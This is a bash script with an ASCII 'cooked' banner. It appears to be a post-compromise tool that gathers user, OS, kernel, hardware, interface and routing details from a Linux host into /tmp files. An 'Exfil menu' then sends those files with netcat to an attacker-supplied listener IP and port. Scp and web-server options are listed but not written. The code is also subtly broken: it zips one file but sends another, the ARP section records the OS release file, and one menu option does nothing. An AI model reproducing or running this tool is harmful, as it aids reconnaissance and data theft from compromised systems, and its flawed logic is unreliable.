#!/bin/bash

	#----- Some functions to clean up the script -----

cs () {
	clear
}

nl () {
	echo -e " "
}

cooked () {
	echo -e "                  )        (\n               ( /(    (   )\ )\n  (   (    (   )\())  ))\ (()/(\n  )\  )\   )\ ((_)\  /((_) ((_))\n ((_)((_) ((_)| |(_)(_))   _| |\n/ _|/ _ \/ _ \| / / / -_)/ _\` |\n\__|\___/\___/|_\_\ \___|\__,_|\n----- This box is cooked -----\n"
}

format () {
	cs
	cooked
}

menu () {
	echo -e "[ 1 ] Host enumeration\n"
	echo -e "[ 2 ] Network enumeration\n"
	echo -e "[ 3 ] Host/Network enumeration\n"
	echo -e "[ 4 ] Exfil menu\n"
	echo -e "[ 5 ] Exit\n"
}

netmenu () {
	echo -e "[ 1 ] netcat file share\n"
	echo -e "[ 2 ] scp\n"
	echo -e "[ 3 ] python webserver\n"
	echo -e "[ 4 ] Exit\n"
}

	#----- Start main code block -----
format
read -p "Name your working directory:"$'\n>>> ' dir

	#----- Create path variables -----
hostpath=/tmp/$dir/hostinfo.ckd
netpath=/tmp/$dir/netinfo.ckd


	#----- Check to see if dir already exists -----
	#--- If dir exists, ask to overwrite ---
if [ -d /tmp/$dir ]; then
	format
	echo -e "ERROR: /tmp/$dir already exists!\n"
	read -p "Do you want to wipe /tmp/$dir and replace it? Y/n"$'\n>>> ' ans
			#--- If you want to overwrite, rm dir and create new dir ---
		if [[ $ans =~ ^[Yy]$ ]]; then
			format
			echo -e "Removing and replacing /tmp/$dir"
			rm -rf /tmp/$dir
			mkdir /tmp/$dir
			sleep 3

			#--- If you do not want to overwrite, ask to rename ---
		elif [[ $ans =~ ^[Nn]$ ]]; then
			format
			read -p "Name your working directory:"$'\n>>> ' dir
					#--- If you do not want to overwrite the dir, but choose an existing dir again, exit ---
				if [ -d /tmp/$dir ]; then
        				format
					echo -e "ERROR: /tmp/$dir already exists!\nExiting!\nPlease try again with a directory that does not exist!"
					sleep 3
					exit

			fi
			#--- If you provide something other than y/n, try again ---
	 	elif [[ ! $ans =~ ^[YyNn]$ ]]; then
			format
			echo -e "$ans is unrecognized!"
			nl
			read -p "Name your working directory:"$'\n>>> ' dir
		fi

	#----- If dir does not exist, make the dir and save it to $dir -----
elif [ ! -d /tmp/$dir ]; then
	format
	echo -e "/tmp/$dir does not exist!\n"
	echo -e "Creating your directory!"'\n'"File path = /tmp/$dir"
	mkdir /tmp/$dir
	sleep 3
	format
		#--- Stage files ---
	echo -e "Creating /tmp/$dir/hostinfo.ckd and /tmp/$dir/netinfo.ckd!"
	touch /tmp/$dir/hostinfo.ckd
	touch /tmp/$dir/netinfo.ckd
	sleep 3
fi

	#----- Option menu -----

	#----- Exec host/net commands based on user input -----
loop=1
while [[ $loop=1 ]]; do

	format
	menu
	read -p "Please select an option!"$'\n>>> ' opt

	if [[ $opt = 1 ]]; then
		format
		echo -e "Gathering some basic host information...\n"
		echo -e "Complete information available at /tmp/$dir/hostinfo.ckd!\n"
		sleep 3

			#--- Outputting accessable information to the screen --- 
		format
		echo -e "Your username is: "; /usr/bin/whoami
		user="$(/usr/bin/whoami)"
		nl
		echo -e "Your hostname is: "; /usr/bin/hostname
		#echo hostname > /tmp/$dir/hostinfo.cooked
		host="$(/usr/bin/hostname)"
		nl
		echo -e "Your OS is: "
		if cat /etc/*-release | grep -q "Ubuntu"; then
		        echo "Ubuntu"
		        OS=Ubuntu
		fi
		if cat /etc/*-release | grep -q "Kali"; then
		        echo "Kali"
		        OS=Kali
		fi
		nl

			#--- Formating/wriitng to host file ---
		echo -e "----- Host info -----" > $hostpath
		echo "" >> $hostpath
		echo -e "--- user@host ---" >> $hostpath
		echo -e "$user@$host\n" >> $hostpath
		echo -e "--- OS Information ---" >> $hostpath
		cat /etc/*-release >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Kernel Information ---" >> $hostpath
		cat /proc/version >> $hostpath
		echo "" >> $hostpath
		echo -e "--- CPU Information ---" >> $hostpath
		cat /proc/cpuinfo >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Memory Information ---" >> $hostpath
		cat /proc/meminfo >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Computer Uptime ---" >> $hostpath
		cat /proc/uptime >> $hostpath
		sleep 3

	elif [[ $opt = 2 ]]; then
	        format
		echo -e "Gathering some basic networking information...\n"
	        echo -e "Complete information available at /tmp/$dir/netinfo.ckd!\n"
	        sleep 3

	                #--- Outputting accessable information to the >
	        format
	        echo -e "Your IP/interface is/are: "; /usr/bin/ip -br a
	        ip="$(/usr/bin/ip -br a)"
	        nl
	        #echo -e "Your hostname is: "; /usr/bin/hostname
	        #echo hostname > /tmp/$dir/hostinfo.cooked
	        #host="$(/usr/bin/hostname)"



			#--- Formating/wriitng to host file ---
	        echo -e "----- Net info -----" > $netpath
	        echo "" >> $netpath
	        echo -e "--- Interface Information ---" >> $netpath
	        ip -br a >> $netpath
		ip -br n >> $netpath
	        echo -e "--- ARP ---" >> $netpath
	        cat /etc/*-release >> $netpath
	        echo "" >> $netpath
	        echo -e "--- Fib_trie ---" >> $netpath
	        cat /proc/net/fib_trie >> $netpath
	        echo "" >> $netpath
	        echo -e "--- Route Information ---" >> $netpath
	        cat /proc/net/route >> $netpath
	        echo "" >> $netpath
	        #echo -e "--- Memory Information ---" >> $netpath
	        #cat /proc/meminfo >> $netpath
	        #echo "" >> $netpath
	        #echo -e "--- Computer Uptime ---" >> $netpath
	        #cat /proc/uptime >> $netpath
		sleep 3

	elif [[ $opt = 3 ]]; then
		echo "Doing both"
		sleep 3

	elif [[ $opt = 4 ]]; then
		format
		netmenu
		read -p "Please select a menu!\n" netans
			if [[ $netans = 1 ]]; then
				format
				echo -e "Welcome to the netcat sharing module\n"
				echo -e "Sharing /tmp/$dir...\n"
				echo -e "Create a listener on the box to exfil to...\n"
				echo -e ">>> nc -lvnp PORT < /tmp/$dir\n"
				read -p "Enter the IP of your listener box\n"$'\n>>> ' ip
				read -p "Enter the port of your listener box\n"$'\n>>> ' port
				read -p "When you have created your listener, enter Yy"$'\n>>> ' list
					if [[ $list =~ ^[Yy]$ ]]; then
						format
						zip srv.zip /tmp/$dir/*
						echo -e "Attempting to connect to $ip..."
						echo -e "Command: nc $ip $port > /tmp/$dir/srv.tar"
						sleep 3
						nc $ip $port < /tmp/$dir/srv.tar
						sleep 3
					fi
#			elif
#
#			elif
#
#			elif
#
			fi
	elif [[ $opt = 5 ]]; then
	        format
		echo -e "Exiting!\nGoodbye!"
		sleep 3
		exit
	fi
done

#####__________________ ADD:

#

#cat /proc/cpuinfo
# cat /proc/meminfo
# cat /proc/uptime



# net info
#cat /proc/net/arp
#cat /proc/net/fib_trie
#cat /proc/net/route
## echo -e  "Your IP address(es): "; ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
## TUN=$(ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127) && echo $TUN

#echo $user
#echo $host
#echo $OS


#netcat file host/share
#python file host/share
#clean up option
